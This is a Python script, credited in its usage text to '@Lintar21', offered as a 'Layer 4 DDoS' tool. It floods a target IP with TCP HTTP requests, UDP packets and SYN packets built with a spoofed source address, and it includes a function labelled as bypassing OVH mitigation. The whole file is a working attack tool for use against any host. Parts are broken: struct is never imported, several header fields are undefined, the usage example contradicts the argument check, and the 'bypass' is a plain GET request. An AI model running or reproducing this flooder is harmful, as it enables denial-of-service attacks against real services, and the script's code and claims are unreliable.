import socket
import random
import time
import sys
import string

# Check if all required command-line arguments are provided
if len(sys.argv) < 4:
    print("""
Layer 4 DDoS Method Mixed Development By @Lintar21

Usage: python3 ML4.py <Target_IP> <Port_Tcp>  <Port_Udp> <Time_in_second>
Example: python3 ML4.py 1.1.1.1 120
Notes: Port_Tcp&Udp It's just optional
""")
    sys.exit(1)

# Extract command-line arguments
target_ip = sys.argv[1]
target_port_tcp = int(sys.argv[2]) if len(sys.argv) > 3 else None
target_port_udp = int(sys.argv[3]) if len(sys.argv) > 4 else None
duration = int(sys.argv[-1])

# List of user-agents for variety
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
]

# List of HTTP methods
http_methods = ["GET", "POST", "PUT", "HEAD"]

# Function to send TCP packets
def send_tcp_packet(target_ip, target_port_tcp, method):
    if target_port_tcp is None:
        return
    # Create a TCP socket object
    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connect to the target
        sock_tcp.connect((target_ip, target_port_tcp))

        # Select a random HTTP method and user-agent
        http_method = random.choice(http_methods)
        user_agent = random.choice(user_agents)

        # Generate the HTTP request
        if http_method in ["POST", "PUT"]:
            data_length = random.randint(1, 1024)
            data = ''.join(random.choices(string.ascii_letters + string.digits, k=data_length))
            request = f"{http_method} / HTTP/1.1\r\nUser-Agent: {user_agent}\r\nContent-Length: {data_length}\r\n\r\n{data}"
        else:
            request = f"{http_method} / HTTP/1.1\r\nUser-Agent: {user_agent}\r\n\r\n"

        # Send the request
        sock_tcp.send(request.encode())

        # Flood method
        if method == "flood":
            while True:
                sock_tcp.send(request.encode())
    except Exception as e:
        pass
    finally:
        # Close the TCP socket
        sock_tcp.close()

# Function to send UDP packets
def send_udp_packet(target_ip, target_port_udp):
    if target_port_udp is None:
        return
    # Create a UDP socket object
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Select a random user-agent
        user_agent = random.choice(user_agents)

        # Generate random packet sizes and select a random user-agent for each packet
        packet_size = random.randint(1, 1024)
        packet = bytes(packet_size)

        # Include user-agent header in the packet
        packet_with_header = f"User-Agent: {user_agent}\r\n\r\n".encode() + packet

        # Send the packet to the target
        sock_udp.sendto(packet_with_header, (target_ip, target_port_udp))
    except Exception as e:
        pass
    finally:
        # Close the UDP socket
        sock_udp.close()

# Function to send SYN TCP packets
def send_syn_tcp_packet(target_ip, target_port_tcp):
    if target_port_tcp is None:
        return
    # Create a TCP socket object
    sock_syn = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    try:
        # Generate a random sequence number and IP ID
        seq_num = random.randint(0, 2**32 - 1)
        ip_id = random.randint(0, 2**16 - 1)

        # Craft a SYN packet
        syn_packet = build_syn_packet(target_ip, target_port_tcp, seq_num, ip_id)

        # Send the SYN packet
        sock_syn.sendto(syn_packet, (target_ip, target_port_tcp))
    except Exception as e:
        pass
    finally:
        # Close the SYN socket
        sock_syn.close()

# Function to build a SYN packet
def build_syn_packet(target_ip, target_port_tcp, seq_num, ip_id):
    # IP header
    ip_version = 4
    ip_header_length = 5
    ip_total_length = 20
    ip_ttl = 64
    ip_protocol = socket.IPPROTO_TCP
    ip_src = socket.inet_aton("192.168.1.1")
    ip_dst = socket.inet_aton(target_ip)

    ip_header = struct.pack("!BBHHHBBH4s4s", (ip_version << 4) + ip_header_length, ip_tos, ip_total_length, ip_id, ip_frag_offset, ip_ttl, ip_protocol, ip_checksum, ip_src, ip_dst)

    # TCP header
    tcp_src_port = random.randint(1024, 65535)
    tcp_dst_port = target_port_tcp
    tcp_seq_num = seq_num
    tcp_ack_num = 0
    tcp_data_offset = 5
    tcp_flags = (1 << 1)  # SYN flag
    tcp_window_size = 5840
    tcp_checksum = 0
    tcp_urgent_ptr = 0

    tcp_offset_res = (tcp_data_offset << 4) + 0
    tcp_flags = tcp_flags
    tcp_window = socket.htons(tcp_window_size)
    tcp_checksum = 0
    tcp_urgent_ptr = 0

    tcp_header = struct.pack("!HHLLBBHHH", tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_offset_res, tcp_flags, tcp_window, tcp_checksum, tcp_urgent_ptr)

    # Pseudo-header
    source_address = socket.inet_aton("192.168.1.1")
    dest_address = socket.inet_aton(target_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack("!4s4sBBH", source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    tcp_checksum = checksum(psh)

    # TCP header with correct checksum
    tcp_header = struct.pack("!HHLLBBHHH", tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_offset_res, tcp_flags, tcp_window, tcp_checksum, tcp_urgent_ptr)

    # Construct the SYN packet
    syn_packet = ip_header + tcp_header

    return syn_packet

# Function to calculate checksum
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff

    return s

# Function to bypass OVH mitigation
def bypass_ovh_mitigation(target_ip, target_port_tcp):
    # Create a TCP socket object
    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connect to the target using a known bypass technique
        sock_tcp.connect((target_ip, target_port_tcp))
        sock_tcp.sendto("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip).encode(), (target_ip, target_port_tcp))
    except Exception as e:
        pass
    finally:
        # Close the TCP socket
        sock_tcp.close()

# Start flooding the target
timeout = time.time() + duration
while True:
    if time.time() > timeout:
        break
    else:
        # Send TCP and UDP packets simultaneously
        if target_port_tcp:
            send_tcp_packet(target_ip, target_port_tcp, "raw")
            send_tcp_packet(target_ip, target_port_tcp, "flood")
            send_tcp_packet(target_ip, target_port_tcp, "storm")
            send_syn_tcp_packet(target_ip, target_port_tcp)
            bypass_ovh_mitigation(target_ip, target_port_tcp)
        if target_port_udp:
            send_udp_packet(target_ip, target_port_udp)
        time.sleep(0.01)  # Delay to control the rate of packet sending
